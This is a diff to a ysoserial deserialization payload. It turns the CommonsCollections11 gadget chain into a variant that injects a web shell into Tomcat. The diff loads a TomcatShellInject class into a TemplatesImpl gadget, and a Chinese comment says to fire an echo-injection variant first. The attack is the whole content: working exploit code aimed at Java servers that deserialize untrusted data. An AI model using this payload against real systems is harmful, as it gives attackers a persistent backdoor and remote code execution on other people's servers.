@@ -1,19 +1,17 @@
 
 package ysoserial.payloads;
 
-import org.apache.commons.collections.comparators.TransformingComparator;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.Map;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
-import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
-
-import javax.management.BadAttributeValueExpException;
-import java.lang.reflect.Field;
-import java.util.*;
 
 
 /*
@@ -34,10 +32,11 @@ java.security.manager off OR set jdk.xml.enableTemplatesImplDeserialization=true
 
 @SuppressWarnings({ "rawtypes", "unchecked" })
 @Dependencies({"commons-collections:commons-collections:3.2.1"})
-public class CommonsCollections11  extends PayloadRunner implements ObjectPayload<HashSet> {
+public class CommonsCollections11ForTomcatShellInject extends PayloadRunner implements ObjectPayload<HashSet> {
 
     public HashSet getObject(final String ... command) throws Exception {
-        final Object templates = Gadgets.createTemplatesImpl(command[0]);
+        //todo 需要先使用 CommonsCollections11ForTomcatEchoInject 打一遍，再用这个打
+        final Object templates = Gadgets.createTemplatesImpl(null, TomcatShellInject.class);
         // mock method name until armed
         final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
 
@@ -87,7 +86,7 @@ public class CommonsCollections11  extends PayloadRunner implements ObjectPayloa
     }
 
     public static void main(final String[] args) throws Exception {
-        PayloadRunner.run(CommonsCollections11.class, args);
+        PayloadRunner.run(CommonsCollections11ForTomcatShellInject.class, args);
     }
 
 }
